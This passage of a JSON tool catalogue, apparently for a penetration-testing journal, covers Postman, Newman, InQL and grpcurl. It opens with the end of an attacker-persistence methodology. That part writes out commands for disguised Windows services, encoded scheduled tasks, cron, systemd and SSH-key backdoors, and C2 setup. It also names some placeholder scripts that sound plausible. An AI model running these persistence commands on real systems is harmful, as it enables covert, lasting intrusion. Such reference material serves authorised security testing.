            "command": "sc create \"System Maintenance\" binpath= \"C:\\Windows\\System32\\svchost.exe\" start= auto DisplayName= \"System Maintenance Service\""
          },
          {
            "title": "WMI Event Subscription",
            "details": "Implement WMI-based persistence",
            "command": "powershell -enc \"Register-WmiEvent -Class Win32_ProcessStartTrace -SourceIdentifier 'ProcessStart' -Action { ... }\""
          },
          {
            "title": "Scheduled Task Persistence",
            "details": "Create persistent scheduled tasks",
            "command": "schtasks /create /tn \"Windows Update\" /tr \"powershell -enc ...\" /sc onlogon /ru SYSTEM"
          }
        ]
      },
      {
        "title": "Phase 3: Linux Persistence Implementation",
        "steps": [
          {
            "title": "Cron Job Persistence",
            "details": "Establish persistent cron jobs",
            "command": "echo '0 */6 * * * /usr/local/bin/system_check.sh' | crontab - && chmod 600 /var/spool/cron/crontabs/*"
          },
          {
            "title": "Systemd Service Persistence",
            "details": "Create persistent systemd services",
            "command": "sudo cp persistence.service /etc/systemd/system/ && sudo systemctl enable persistence.service && sudo systemctl start persistence.service"
          },
          {
            "title": "SSH Key Persistence",
            "details": "Add persistent SSH access keys",
            "command": "mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3... user@host' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
          },
          {
            "title": "Init Script Persistence",
            "details": "Modify init scripts for persistence",
            "command": "echo '/usr/local/bin/persistence.sh' >> /etc/rc.local && chmod +x /etc/rc.local"
          }
        ]
      },
      {
        "title": "Phase 4: Cloud & Network Persistence",
        "steps": [
          {
            "title": "Cloud Instance Persistence",
            "details": "Establish persistence in cloud environments",
            "command": "python3 cloud_persistence.py --provider aws --instance-id i-1234567890abcdef0 --method iam_role,instance_profile --output ~/pt-journal-sessions/*/evidence/cloud_persistence.txt"
          },
          {
            "title": "Container Persistence",
            "details": "Implement persistence in containerized environments",
            "command": "python3 container_persistence.py --target docker --method volume_mount,host_network --output ~/pt-journal-sessions/*/evidence/container_persistence.txt"
          },
          {
            "title": "Network Device Persistence",
            "details": "Establish persistence on network infrastructure",
            "command": "python3 network_persistence.py --device router/firewall --method config_backdoor,firmware_mod --output ~/pt-journal-sessions/*/evidence/network_persistence.txt"
          },
          {
            "title": "C2 Communication Setup",
            "details": "Establish command and control communications",
            "command": "python3 c2_setup.py --domain c2.target.com --port 443 --protocol https,dns --encryption aes256 --output ~/pt-journal-sessions/*/evidence/c2_config.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Multi-Platform Persistence Pipeline",
        "stages": [
          {
            "label": "Day 1: Platform Analysis",
            "description": "Analyze target platforms and select persistence methods",
            "command": "python3 platform_analyzer.py --target target_network --output ~/pt-journal-sessions/*/evidence/platform_analysis.txt"
          },
          {
            "label": "Day 2-3: Persistence Implementation",
            "description": "Implement primary and backup persistence mechanisms",
            "command": "python3 deploy_persistence.py --methods ~/pt-journal-sessions/*/evidence/selected_methods.txt --target target_system --stealth"
          },
          {
            "label": "Day 4: C2 Establishment",
            "description": "Establish and test command and control communications",
            "command": "python3 c2_deploy.py --config ~/pt-journal-sessions/*/evidence/c2_config.txt --test-connectivity"
          },
          {
            "label": "Day 5: Redundancy Setup",
            "description": "Implement redundant persistence mechanisms",
            "command": "python3 redundancy_deploy.py --primary ~/pt-journal-sessions/*/evidence/persistence.txt --backup-methods service,cron,registry"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Service created successfully: System Maintenance",
        "meaning": "Windows service persistence established",
        "severity": "High"
      },
      {
        "indicator": "Cron job installed: /etc/cron.d/persistence",
        "meaning": "Linux cron persistence established",
        "severity": "High"
      },
      {
        "indicator": "C2 beacon received: Heartbeat successful",
        "meaning": "Command and control communication established",
        "severity": "High"
      },
      {
        "indicator": "Cloud IAM role created: persistence_role",
        "meaning": "Cloud persistence via IAM established",
        "severity": "High"
      },
      {
        "indicator": "Redundancy level: 3 backup mechanisms",
        "meaning": "Multiple redundant persistence methods active",
        "severity": "High"
      }
    ],
    "advanced_usage": [
      {
        "title": "Living Off the Land Persistence",
        "scenario": "Use legitimate system tools for persistence",
        "command": "python3 lotl_persistence.py --target-system windows --allowed-tools powershell,wmi,schtask --stealth-level maximum",
        "notes": [
          "LOLBin techniques reduce detection signatures"
        ]
      },
      {
        "title": "AI-Generated Persistence",
        "scenario": "Use AI to create custom persistence mechanisms",
        "command": "python3 ai_persistence.py --target-platform mixed --detection-evasion adaptive --custom-methods --output ~/pt-journal-sessions/*/evidence/ai_persistence.py",
        "notes": [
          "AI can create novel persistence techniques"
        ]
      },
      {
        "title": "Quantum-Resistant C2",
        "scenario": "Implement quantum-resistant C2 communications",
        "command": "python3 quantum_c2.py --domain c2.target.com --encryption post-quantum --key-exchange ntru --output ~/pt-journal-sessions/*/evidence/quantum_c2.txt",
        "notes": [
          "Future-proofing against quantum computing attacks"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Persistence Tools Comparison",
      "columns": ["Tool", "Platform", "Stealth", "Flexibility", "Detection Resistance"],
      "rows": [
        ["Empire", "Windows/Linux", "High", "Very High", "High"],
        ["Metasploit", "Cross-platform", "Medium", "High", "Medium"],
        ["Custom Scripts", "Any", "Very High", "Complete", "Very High"],
        ["PowerShell", "Windows", "High", "High", "High"],
        ["Systemd/Cron", "Linux", "Medium", "Low", "Low"]
      ]
    },
    "resources": [
      {
        "label": "Windows Persistence Techniques",
        "url": "https://attack.mitre.org/techniques/T1543/",
        "description": "MITRE ATT&CK techniques for Windows persistence"
      },
      {
        "label": "Linux Persistence Guide",
        "url": "https://www.sans.org/white-papers/36846/",
        "description": "Comprehensive Linux persistence techniques"
      },
      {
        "label": "Cloud Persistence Research",
        "url": "https://www.blackhat.com/presentations/bh-usa-21/",
        "description": "Latest research in cloud persistence techniques"
      }
    ]
  },
  {
    "id": "postman",
    "name": "Postman",
    "summary": "Postman is a comprehensive API development and testing platform that enables teams to design, test, document, and monitor APIs through a graphical interface with powerful automation capabilities.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Snap or download AppImage",
        "steps": [
          {
            "detail": "sudo snap install postman",
            "copyable": true
          },
          {
            "detail": "# Alternative: Download AppImage",
            "copyable": false
          },
          {
            "detail": "wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz",
            "copyable": true
          },
          {
            "detail": "sudo tar -xzf postman-linux-x64.tar.gz -C /opt",
            "copyable": true
          },
          {
            "detail": "ln -s /opt/Postman/Postman /usr/local/bin/postman",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via package manager or flatpak",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y postman",
            "copyable": true
          },
          {
            "detail": "# Alternative via flatpak",
            "copyable": false
          },
          {
            "detail": "flatpak install flathub com.getpostman.Postman",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Postman CLI (newman) in container or web version",
        "steps": [
          {
            "detail": "# Use Newman CLI in container",
            "copyable": false
          },
          {
            "detail": "docker pull postman/newman",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/etc/newman postman/newman run collection.json",
            "copyable": true
          },
          {
            "detail": "# Web version: https://web.postman.co",
            "copyable": false
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Create API request",
        "command": "POST /api/users\n{\n  \"name\": \"John Doe\",\n  \"email\": \"john@example.com\"\n}",
        "notes": ["Use Postman GUI to build and send requests"]
      },
      {
        "description": "Environment variable usage",
        "command": "{{base_url}}/api/users/{{user_id}}",
        "notes": ["Variables enable dynamic requests across environments"]
      },
      {
        "description": "Test script example",
        "command": "pm.test(\"Status code is 200\", function () {\n    pm.response.to.have.status(200);\n});",
        "notes": ["JavaScript test scripts validate responses"]
      },
      {
        "description": "Collection runner",
        "command": "Run entire collection with data files",
        "notes": ["Automate testing workflows with multiple iterations"]
      }
    ],
    "common_flags": [
      {
        "flag": "Environment Variables",
        "description": "{{variable_name}} syntax for dynamic values"
      },
      {
        "flag": "Pre-request Script",
        "description": "JavaScript executed before request"
      },
      {
        "flag": "Tests Script",
        "description": "JavaScript executed after response"
      },
      {
        "flag": "Collection Runner",
        "description": "Execute multiple requests sequentially"
      },
      {
        "flag": "Monitor",
        "description": "Schedule automated API testing"
      }
    ],
    "operational_tips": [
      "Use environments to separate development, staging, and production configurations.",
      "Implement test scripts to automatically validate API responses and schemas.",
      "Leverage collection variables to share authentication tokens across requests.",
      "Use data files (CSV/JSON) for parameterized testing with large datasets.",
      "Configure global certificates for testing APIs with custom CA certificates."
    ],
    "step_sequences": [
      {
        "title": "API Testing Workflow",
        "steps": [
          {
            "title": "Create environment",
            "details": "Set up environment variables for base URL, credentials, and endpoints.",
            "command": "Environment: base_url = https://api.example.com"
          },
          {
            "title": "Authentication setup",
            "details": "Configure OAuth2, API key, or Bearer token authentication.",
            "command": "Authorization: Bearer {{access_token}}"
          },
          {
            "title": "Build requests",
            "details": "Create requests with proper headers, body, and test scripts.",
            "command": "POST {{base_url}}/auth/login"
          },
          {
            "title": "Write tests",
            "details": "Add JavaScript tests to validate responses and schemas.",
            "command": "pm.test(\"Response has user data\", () => pm.expect(pm.response.json()).to.have.property('user'));"
          },
          {
            "title": "Run collection",
            "details": "Execute entire collection with different environments and data.",
            "command": "Collection Runner  Select collection  Run"
          }
        ]
      },
      {
        "title": "API Documentation Generation",
        "steps": [
          {
            "title": "Document requests",
            "details": "Add descriptions and example responses for each endpoint.",
            "command": "Request description: Creates a new user account"
          },
          {
            "title": "Generate documentation",
            "details": "Export collection as HTML or publish to Postman workspace.",
            "command": "Export  Collection Documentation  HTML"
          },
          {
            "title": "Share with team",
            "details": "Publish to team workspace for collaborative documentation.",
            "command": "Share  Generate embed link  Copy to documentation"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "API Discovery  Testing  Documentation",
        "stages": [
          {
            "label": "Import OpenAPI/Swagger",
            "description": "Import existing API specification to generate collection.",
            "command": "Import  Raw text  Paste OpenAPI JSON"
          },
          {
            "label": "Environment Configuration",
            "description": "Set up environments for different API deployment stages.",
            "command": "Environment  Add variable  base_url = https://dev-api.example.com"
          },
          {
            "label": "Authentication Setup",
            "description": "Configure OAuth2 flow or API key authentication.",
            "command": "Authorization  OAuth 2.0  Configure flow"
          },
          {
            "label": "Test Implementation",
            "description": "Add comprehensive test scripts for each endpoint.",
            "command": "Tests  pm.test(\"Schema validation\", () => {...});"
          },
          {
            "label": "Automated Execution",
            "description": "Run collections with Newman for CI/CD integration.",
            "command": "newman run collection.json -e environment.json"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "200 OK",
        "meaning": "Request successful, response body contains expected data",
        "severity": "info"
      },
      {
        "indicator": "401 Unauthorized",
        "meaning": "Authentication failed, check token or credentials",
        "severity": "warning"
      },
      {
        "indicator": "429 Too Many Requests",
        "meaning": "Rate limit exceeded, implement throttling in tests",
        "severity": "warning"
      },
      {
        "indicator": "Test Results: 5/10 passed",
        "meaning": "Half of assertions failed, review test logic and API changes",
        "severity": "error"
      }
    ],
    "advanced_usage": [
      {
        "title": "Dynamic authentication with OAuth2",
        "command": "pm.sendRequest({\n  url: 'https://auth.example.com/oauth/token',\n  method: 'POST',\n  body: {\n    mode: 'urlencoded',\n    urlencoded: [\n      {key: 'grant_type', value: 'client_credentials'},\n      {key: 'client_id', value: pm.variables.get('client_id')},\n      {key: 'client_secret', value: pm.variables.get('client_secret')}\n    ]\n  }\n}, (err, res) => {\n  if (res) {\n    pm.variables.set('access_token', res.json().access_token);\n  }\n});",
        "scenario": "Automatically refresh OAuth tokens before requests",
        "notes": ["Store tokens in environment variables for subsequent requests"]
      },
      {
        "title": "Schema validation with JSON Schema",
        "command": "const schema = {\n  \"type\": \"object\",\n  \"properties\": {\n    \"id\": {\"type\": \"number\"},\n    \"name\": {\"type\": \"string\"},\n    \"email\": {\"type\": \"string\", \"format\": \"email\"}\n  },\n  \"required\": [\"id\", \"name\", \"email\"]\n};\n\npm.test(\"Schema validation\", function() {\n  const responseJson = pm.response.json();\n  pm.expect(tv4.validate(responseJson, schema)).to.be.true;\n});",
        "scenario": "Validate API responses against JSON Schema",
        "notes": ["Ensure API contract compliance and data integrity"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Postman Learning Center",
        "url": "https://learning.postman.com/",
        "description": "Official documentation and tutorials"
      },
      {
        "label": "Postman API Network",
        "url": "https://www.postman.com/api-network/",
        "description": "Public API collections and documentation"
      },
      {
        "label": "Newman CLI Documentation",
        "url": "https://github.com/postmanlabs/newman",
        "description": "Command-line tool for automated collection execution"
      }
    ]
  },
  {
    "id": "newman",
    "name": "Newman",
    "summary": "Newman is Postman's command-line Collection Runner that enables automated API testing, continuous integration, and performance testing from the terminal or CI/CD pipelines.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via npm or Node.js package manager",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nodejs npm",
            "copyable": true
          },
          {
            "detail": "npm install -g newman",
            "copyable": true
          },
          {
            "detail": "newman --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via npm or use pre-installed Node.js",
        "steps": [
          {
            "detail": "sudo npm install -g newman",
            "copyable": true
          },
          {
            "detail": "# Install additional reporters",
            "copyable": false
          },
          {
            "detail": "npm install -g newman-reporter-html",
            "copyable": true
          },
          {
            "detail": "npm install -g newman-reporter-junit",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official Docker image for containerized execution",
        "steps": [
          {
            "detail": "docker pull postman/newman",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/etc/newman postman/newman run collection.json",
            "copyable": true
          },
          {
            "detail": "# With custom reporters",
            "copyable": false
          },
          {
            "detail": "docker run --rm -v $PWD:/etc/newman postman/newman run collection.json -r html,junit",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Run collection with environment",
        "command": "newman run collection.json -e environment.json",
        "notes": ["Basic collection execution with environment variables"]
      },
      {
        "description": "Run with data file",
        "command": "newman run collection.json -d data.csv",
        "notes": ["Parameterized testing with CSV/JSON data files"]
      },
      {
        "description": "Generate HTML report",
        "command": "newman run collection.json -r html",
        "notes": ["Create detailed HTML reports for test results"]
      },
      {
        "description": "CI/CD integration",
        "command": "newman run collection.json --bail",
        "notes": ["Stop on first failure for CI pipelines"]
      }
    ],
    "common_flags": [
      {
        "flag": "-e, --environment",
        "description": "Specify environment file"
      },
      {
        "flag": "-d, --iteration-data",
        "description": "Specify data file for iterations"
      },
      {
        "flag": "-n, --iteration-count",
        "description": "Number of iterations to run"
      },
      {
        "flag": "-r, --reporters",
        "description": "Specify output reporters (cli, json, html, junit)"
      },
      {
        "flag": "--bail",
        "description": "Stop on first test failure"
      },
      {
        "flag": "--timeout-request",
        "description": "Request timeout in milliseconds"
      },
      {
        "flag": "--delay-request",
        "description": "Delay between requests in milliseconds"
      }
    ],
    "operational_tips": [
      "Use --bail flag in CI/CD pipelines to fail fast on test failures.",
      "Install additional reporters (html, junit, allure) for better test reporting.",
      "Use environment variables to secure sensitive data like API keys and passwords.",
      "Combine with Newman Docker for consistent execution across environments.",
      "Use iteration data files for comprehensive parameterized testing scenarios."
    ],
    "step_sequences": [
      {
        "title": "CI/CD Pipeline Integration",
        "steps": [
          {
            "title": "Export collection",
            "details": "Export Postman collection and environment from GUI.",
            "command": "Postman  Export  Collection  Save as collection.json"
          },
          {
            "title": "Install Newman",
            "details": "Install Newman and required reporters in CI environment.",
            "command": "npm install -g newman newman-reporter-junit newman-reporter-html"
          },
          {
            "title": "Configure environment",
            "details": "Set up environment variables for different deployment stages.",
            "command": "export API_BASE_URL=https://api.staging.example.com"
          },
          {
            "title": "Run tests",
            "details": "Execute collection with appropriate reporters for CI integration.",
            "command": "newman run collection.json -e staging.json -r junit --bail"
          },
          {
            "title": "Parse results",
            "details": "Process test results and generate reports for team visibility.",
            "command": "newman run collection.json -r html --reporter-html-export report.html"
          }
        ]
      },
      {
        "title": "Performance Testing Setup",
        "steps": [
          {
            "title": "Configure load testing",
            "details": "Set up multiple iterations and delays for load simulation.",
            "command": "newman run collection.json -n 100 --delay-request 100"
          },
          {
            "title": "Monitor resources",
            "details": "Track response times and system resource utilization.",
            "command": "newman run collection.json --reporter-cli-no-success-assertions"
          },
          {
            "title": "Analyze results",
            "details": "Review performance metrics and identify bottlenecks.",
            "command": "cat newman-report.json | jq '.run.executions[].response.responseTime'"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "API Testing  CI Integration  Reporting",
        "stages": [
          {
            "label": "Local Development",
            "description": "Test APIs locally with Postman GUI",
            "command": "Postman Desktop  Create and validate requests"
          },
          {
            "label": "Collection Export",
            "description": "Export validated collection for automation",
            "command": "Export Collection  Save as API-Tests.json"
          },
          {
            "label": "Environment Setup",
            "description": "Create environment files for each deployment stage",
            "command": "Environment Variables  Export  staging.json, prod.json"
          },
          {
            "label": "CI Pipeline",
            "description": "Integrate Newman in GitHub Actions/Jenkins",
            "command": "newman run API-Tests.json -e $ENVIRONMENT.json -r junit --bail"
          },
          {
            "label": "Report Generation",
            "description": "Generate comprehensive test reports",
            "command": "newman run API-Tests.json -r html --reporter-html-export test-report.html"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": " GET /api/users (200 OK)",
        "meaning": "Request successful, all tests passed",
        "severity": "info"
      },
      {
        "indicator": " POST /api/users (401 Unauthorized)",
        "meaning": "Authentication failed, check credentials or token",
        "severity": "error"
      },
      {
        "indicator": "",
        "meaning": "Progress indicator showing test execution",
        "severity": "info"
      },
      {
        "indicator": "Test Results: 15/20 passed",
        "meaning": "Some tests failed, review assertions and API changes",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "GitHub Actions Integration",
        "command": "name: API Tests\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - name: Setup Node.js\n        uses: actions/setup-node@v2\n        with:\n          node-version: '16'\n      - name: Install Newman\n        run: npm install -g newman newman-reporter-html\n      - name: Run API Tests\n        run: newman run collection.json -e environment.json -r html --bail",
        "scenario": "Automated API testing in CI/CD pipeline",
        "notes": ["Fail fast on test failures, generate HTML reports"]
      },
      {
        "title": "Custom Reporter Configuration",
        "command": "newman run collection.json -r custom --reporter-custom-output custom-report.json",
        "scenario": "Create custom test reports for specific team requirements",
        "notes": ["Develop custom reporters for specialized reporting needs"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Newman Documentation",
        "url": "https://github.com/postmanlabs/newman",
        "description": "Official Newman CLI documentation"
      },
      {
        "label": "Newman Reporters",
        "url": "https://github.com/postmanlabs/newman#reporters",
        "description": "Available reporters for different output formats"
      },
      {
        "label": "CI/CD Integration Guide",
        "url": "https://learning.postman.com/docs/collection-runs/automating-runs/",
        "description": "Guide for integrating Newman in CI/CD pipelines"
      }
    ]
  },
  {
    "id": "inql",
    "name": "InQL",
    "summary": "InQL is a GraphQL security testing tool that automates the process of GraphQL schema discovery, introspection, and security analysis for identifying vulnerabilities in GraphQL APIs.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Python pip and Git",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y python3 python3-pip git",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/doyensec/inql.git",
            "copyable": true
          },
          {
            "detail": "cd inql",
            "copyable": true
          },
          {
            "detail": "pip3 install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "python3 inql.py --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install as Python package or from source",
        "steps": [
          {
            "detail": "sudo apt install -y python3-pip",
            "copyable": true
          },
          {
            "detail": "pip3 install inql",
            "copyable": true
          },
          {
            "detail": "# Alternative: Install from source",
            "copyable": false
          },
          {
            "detail": "git clone https://github.com/doyensec/inql.git && cd inql && pip3 install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use pre-built Docker image for containerized execution",
        "steps": [
          {
            "detail": "docker pull doyensec/inql",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/data doyensec/inql -t https://api.example.com/graphql",
            "copyable": true
          },
          {
            "detail": "# Build from source",
            "copyable": false
          },
          {
            "detail": "git clone https://github.com/doyensec/inql.git && cd inql && docker build -t inql .",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "GraphQL schema introspection",
        "command": "inql -t https://api.example.com/graphql",
        "notes": ["Extract complete GraphQL schema from endpoint"]
      },
      {
        "description": "Generate queries from schema",
        "command": "inql -s schema.graphql -o queries/",
        "notes": ["Generate test queries based on discovered schema"]
      },
      {
        "description": "Burp Suite integration",
        "command": "java -jar inql-burp.jar",
        "notes": ["Launch InQL as Burp Suite extension"]
      },
      {
        "description": "Analyze GraphQL endpoint",
        "command": "inql -a -t https://api.example.com/graphql",
        "notes": ["Perform security analysis on GraphQL API"]
      }
    ],
    "common_flags": [
      {
        "flag": "-t, --target",
        "description": "Target GraphQL endpoint URL"
      },
      {
        "flag": "-s, --schema",
        "description": "Path to GraphQL schema file"
      },
      {
        "flag": "-o, --output",
        "description": "Output directory for generated files"
      },
      {
        "flag": "-a, --analyze",
        "description": "Perform security analysis"
      },
      {
        "flag": "-p, --proxy",
        "description": "Proxy settings for HTTP requests"
      },
      {
        "flag": "-H, --header",
        "description": "Custom HTTP headers"
      }
    ],
    "operational_tips": [
      "Use introspection queries to discover hidden GraphQL endpoints.",
      "Generate custom queries from schema for comprehensive testing.",
      "Integrate with Burp Suite for interactive testing workflows.",
      "Analyze mutation operations for privilege escalation vulnerabilities.",
      "Check for excessive data exposure in query responses."
    ],
    "step_sequences": [
      {
        "title": "GraphQL Security Assessment",
        "steps": [
          {
            "title": "Schema discovery",
            "details": "Extract GraphQL schema using introspection queries.",
            "command": "inql -t https://api.example.com/graphql -o schema_output/"
          },
          {
            "title": "Query generation",
            "details": "Generate test queries from discovered schema.",
            "command": "inql -s schema_output/schema.graphql -o test_queries/"
          },
          {
            "title": "Security analysis",
            "details": "Perform automated security analysis on GraphQL API.",
            "command": "inql -a -t https://api.example.com/graphql"
          },
          {
            "title": "Manual testing",
            "details": "Use generated queries for manual security testing.",
            "command": "curl -X POST -d @test_queries/query_1.graphql https://api.example.com/graphql"
          },
          {
            "title": "Vulnerability validation",
            "details": "Validate findings and prepare detailed reports.",
            "command": "Review generated HTML reports and findings"
          }
        ]
      },
      {
        "title": "Burp Suite Integration",
        "steps": [
          {
            "title": "Install extension",
            "details": "Load InQL as Burp Suite extension.",
            "command": "Extender  Extensions  Add  inql-burp.jar"
          },
          {
            "title": "Configure target",
            "details": "Set target GraphQL endpoint in InQL tab.",
            "command": "InQL tab  Target  https://api.example.com/graphql"
          },
          {
            "title": "Extract schema",
            "details": "Use InQL to extract and analyze GraphQL schema.",
            "command": "Introspection  Extract Schema"
          },
          {
            "title": "Generate queries",
            "details": "Generate test queries for security testing.",
            "command": "Query Generator  Select operations  Generate"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Schema Discovery  Query Generation  Security Testing",
        "stages": [
          {
            "label": "Endpoint Discovery",
            "description": "Identify GraphQL endpoints through reconnaissance",
            "command": "ffuf -w wordlist.txt -u https://example.com/FUZZ/graphql -mc 200"
          },
          {
            "label": "Schema Extraction",
            "description": "Extract complete GraphQL schema using introspection",
            "command": "inql -t https://api.example.com/graphql -o schema/"
          },
          {
            "label": "Query Generation",
            "description": "Generate comprehensive test queries from schema",
            "command": "inql -s schema/schema.graphql -o queries/"
          },
          {
            "label": "Security Analysis",
            "description": "Perform automated vulnerability scanning",
            "command": "inql -a -t https://api.example.com/graphql"
          },
          {
            "label": "Manual Validation",
            "description": "Manually test generated queries for vulnerabilities",
            "command": "curl -X POST -d @queries/mutation.graphql -H 'Content-Type: application/json' https://api.example.com/graphql"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Schema extracted: 15 queries, 8 mutations, 3 subscriptions",
        "meaning": "Successfully extracted complete GraphQL schema",
        "severity": "info"
      },
      {
        "indicator": "Vulnerability: Exposed sensitive information",
        "meaning": "GraphQL API exposes sensitive data through queries",
        "severity": "warning"
      },
      {
        "indicator": "Generated 42 test queries",
        "meaning": "Created comprehensive test coverage for schema",
        "severity": "info"
      },
      {
        "indicator": "Introspection disabled",
        "meaning": "GraphQL endpoint has introspection disabled, try alternative methods",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Introspection Queries",
        "command": "inql -t https://api.example.com/graphql -H 'Authorization: Bearer $TOKEN' -p http://127.0.0.1:8080",
        "scenario": "Introspect authenticated GraphQL APIs through proxy",
        "notes": ["Use custom headers for authentication and proxy for traffic analysis"]
      },
      {
        "title": "Batch Query Generation",
        "command": "for endpoint in $(cat endpoints.txt); do\n  inql -t $endpoint -o output/$(basename $endpoint)\ndone",
        "scenario": "Automate schema extraction for multiple GraphQL endpoints",
        "notes": ["Scale analysis across multiple targets efficiently"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "InQL GitHub Repository",
        "url": "https://github.com/doyensec/inql",
        "description": "Official InQL source code and documentation"
      },
      {
        "label": "GraphQL Security Testing Guide",
        "url": "https://github.com/doyensec/inql/blob/master/docs/GraphQL-Security.md",
        "description": "Comprehensive GraphQL security testing methodology"
      },
      {
        "label": "Burp Suite Extension",
        "url": "https://portswigger.net/bappstore/8a2a7b687a5a4f8a8d2f7f5e8a3b7a5e",
        "description": "InQL Burp Suite extension for interactive testing"
      }
    ]
  },
  {
    "id": "grpcurl",
    "name": "grpcurl",
    "summary": "grpcurl is a command-line tool that lets you interact with gRPC servers, similar to how curl interacts with HTTP/REST servers. It supports reflection, service discovery, and message inspection.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Go or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "# Option 1: Go install",
            "copyable": false
          },
          {
            "detail": "go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest",
            "copyable": true
          },
          {
            "detail": "# Option 2: Download binary",
            "copyable": false
          },
          {
            "detail": "wget https://github.com/fullstorydev/grpcurl/releases/latest/download/grpcurl_1.8.9_linux_x86_64.tar.gz",
            "copyable": true
          },
          {
            "detail": "tar -xzf grpcurl_1.8.9_linux_x86_64.tar.gz && sudo mv grpcurl /usr/local/bin/",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via Go or package manager",
        "steps": [
          {
            "detail": "sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest",
            "copyable": true
          },
          {
            "detail": "echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc",
            "copyable": true
          },
          {
            "detail": "source ~/.bashrc",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker container for isolated execution",
        "steps": [
          {
            "detail": "docker run --rm -v $PWD:/data fullstorydev/grpcurl -help",
            "copyable": true
          },
          {
            "detail": "# Build from source",
            "copyable": false
          },
          {
            "detail": "git clone https://github.com/fullstorydev/grpcurl.git && cd grpcurl && go build ./cmd/grpcurl",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "List services",
        "command": "grpcurl localhost:50051 list",
        "notes": ["List all available gRPC services"]
      },
      {
        "description": "Describe service",
        "command": "grpcurl localhost:50051 describe myservice.MyService",
        "notes": ["Get detailed service definition"]
      },
      {
        "description": "Call RPC method",
        "command": "grpcurl -d '{\"name\": \"test\"}' localhost:50051 myservice.MyService/GetUser",
        "notes": ["Invoke gRPC method with JSON data"]
      },
      {
        "description": "Use reflection",
        "command": "grpcurl -plaintext localhost:50051 describe",
        "notes": ["Use server reflection to discover services"]
      }
    ],
    "common_flags": [
      {
        "flag": "-d, -data",
        "description": "JSON data for request body"
      },
      {
        "flag": "-plaintext",
        "description": "Use insecure connection (no TLS)"
      },
      {
        "flag": "-insecure",
        "description": "Skip server certificate validation"
      },
      {
        "flag": "-proto",
        "description": "Path to proto file"
      },
      {
        "flag": "-import-path",
        "description": "Path to proto import directories"
      },
      {
        "flag": "-emit-defaults",
        "description": "Emit default values in responses"
      }
    ],
    "operational_tips": [
      "Use server reflection to discover services without proto files.",
      "Combine with protoc for generating proto definitions from reflection.",
      "Use -plaintext for local development without TLS setup.",
      "Pipe JSON output to jq for complex data manipulation.",
      "Use -emit-defaults to see complete message structure."
    ],
    "step_sequences": [
      {
        "title": "gRPC Service Discovery",
        "steps": [
          {
            "title": "Connect to server",
            "details": "Establish connection to gRPC server.",
            "command": "grpcurl -plaintext localhost:50051 list"
          },
          {
            "title": "List services",
            "details": "Discover all available services on server.",
            "command": "grpcurl -plaintext localhost:50051 describe"
          },
          {
            "title": "Examine service",
            "details": "Get detailed service method definitions.",
            "command": "grpcurl -plaintext localhost:50051 describe myservice.MyService"
          },
          {
            "title": "Test method",
            "details": "Call specific RPC method with test data.",
            "command": "grpcurl -plaintext -d '{}' localhost:50051 myservice.MyService/ListUsers"
          }
        ]
      },
      {
        "title": "Proto File Analysis",
        "steps": [
          {
            "title": "Load proto files",
            "details": "Load proto files for service definitions.",
            "command": "grpcurl -proto service.proto -import-path ."
          },
          {
            "title": "Describe message",
            "details": "Examine message structure.",
            "command": "grpcurl -proto service.proto describe .myservice.User"
          },
          {
            "title": "Call with proto",
